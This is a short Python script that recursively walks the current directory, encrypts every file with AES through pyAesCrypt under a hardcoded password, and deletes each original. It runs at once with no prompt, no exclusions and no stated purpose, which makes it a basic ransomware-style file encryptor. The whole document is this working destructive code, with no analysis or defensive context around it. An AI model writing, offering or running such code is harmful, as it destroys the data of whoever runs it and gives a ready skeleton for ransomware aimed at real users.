import os
import pyAesCrypt

directory = os.getcwd()
password = "123"


def crypt(file):
    buffer_size = 512 * 1024
    pyAesCrypt.encryptFile(file, file + ".crp", password, buffer_size)
    print("[Encrypt] '" + file + ".crp'")
    os.remove(file)


def walk(directory):
    for name in os.listdir(directory):
        path = os.path.join(directory, name)
        if os.path.isfile(path):
            crypt(path)
        else:
            walk(path)


walk(directory)
print("-" * 80)
